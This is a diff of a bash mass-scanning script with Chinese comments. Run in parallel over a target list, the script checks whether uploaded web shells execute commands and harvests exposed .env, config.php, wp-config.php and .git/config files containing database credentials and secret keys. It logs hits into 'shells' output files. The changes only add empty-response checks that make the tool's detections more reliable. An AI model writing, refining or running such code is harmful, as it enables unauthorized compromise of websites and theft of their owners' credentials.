@@ -106,7 +106,7 @@ cat $OUT/targets.txt | xargs -P 20 -I {} bash -c '
                         v2=$(curl -skL -m 4 "$shell?0=echo+test123" 2>/dev/null)
                         if echo "$v2" | grep -q "test123"; then
                             # 验证3: 确保不是错误页面
-                            if ! echo "$v2" | grep -qiE "error|404|not found|forbidden|access denied"; then
+                            if [ -n "$v2" ] && ! echo "$v2" | grep -qiE "error|404|not found|forbidden|access denied"; then
                                 echo "$shell" >> "$OUT/shells/01_upload.txt"
                                 rm -f /tmp/u_$$_${ext}
                                 exit 0
@@ -135,7 +135,7 @@ cat $OUT/targets.txt | xargs -P 20 -I {} bash -c '
     env_resp=$(curl -skL -m 5 "$url/.env" 2>/dev/null)
     if [ $(echo "$env_resp" | wc -c) -gt 50 ]; then
         # 验证：包含KEY=VALUE格式，且不是HTML
-        if echo "$env_resp" | grep -qE "^[A-Z_]+=.*" && ! echo "$env_resp" | grep -qiE "<html|<body|<!DOCTYPE"; then
+        if [ -n "$env_resp" ] && echo "$env_resp" | grep -qE "^[A-Z_]+=.*" && ! echo "$env_resp" | grep -qiE "<html|<body|<!DOCTYPE"; then
             # 验证：包含常见环境变量名
             if echo "$env_resp" | grep -qiE "DB_|APP_|API_|SECRET|KEY|PASSWORD"; then
                 echo "$url/.env" >> "$OUT"/shells/02_env.txt
@@ -147,7 +147,7 @@ cat $OUT/targets.txt | xargs -P 20 -I {} bash -c '
     php_resp=$(curl -skL -m 5 "$url/config.php" 2>/dev/null)
     if [ $(echo "$php_resp" | wc -c) -gt 100 ]; then
         # 验证：包含PHP标签和配置
-        if echo "$php_resp" | grep -qE "<?php" && echo "$php_resp" | grep -qiE "define|config|database|db_" && \
+        if [ -n "$php_resp" ] && echo "$php_resp" | grep -qE "<?php" && echo "$php_resp" | grep -qiE "define|config|database|db_" && \
            ! echo "$php_resp" | grep -qiE "<html|<body|404|not found|forbidden"; then
             echo "$url/config.php" >> "$OUT"/shells/02_config.txt
         fi
@@ -155,7 +155,7 @@ cat $OUT/targets.txt | xargs -P 20 -I {} bash -c '
     
     # wp-config.php（WordPress特定验证）
     wp_resp=$(curl -skL -m 5 "$url/wp-config.php" 2>/dev/null)
-    if [ $(echo "$wp_resp" | wc -c) -gt 200 ]; then
+    if [ -n "$wp_resp" ] && [ $(echo "$wp_resp" | wc -c) -gt 200 ]; then
         if echo "$wp_resp" | grep -qE "<?php" && echo "$wp_resp" | grep -qiE "DB_NAME|DB_USER|DB_PASSWORD" && \
            ! echo "$wp_resp" | grep -qiE "<html|<body|404"; then
             echo "$url/wp-config.php" >> "$OUT"/shells/02_wpconfig.txt
@@ -164,7 +164,7 @@ cat $OUT/targets.txt | xargs -P 20 -I {} bash -c '
     
     # .git/config（验证Git配置格式）
     git_resp=$(curl -skL -m 5 "$url/.git/config" 2>/dev/null)
-    if [ $(echo "$git_resp" | wc -c) -gt 50 ]; then
+    if [ -n "$git_resp" ] && [ $(echo "$git_resp" | wc -c) -gt 50 ]; then
         if echo "$git_resp" | grep -qE "\[.*\]" && echo "$git_resp" | grep -qiE "remote|url|branch" && \
            ! echo "$git_resp" | grep -qiE "<html|<body|404"; then
             echo "$url/.git/config" >> "$OUT"/shells/02_git.txt
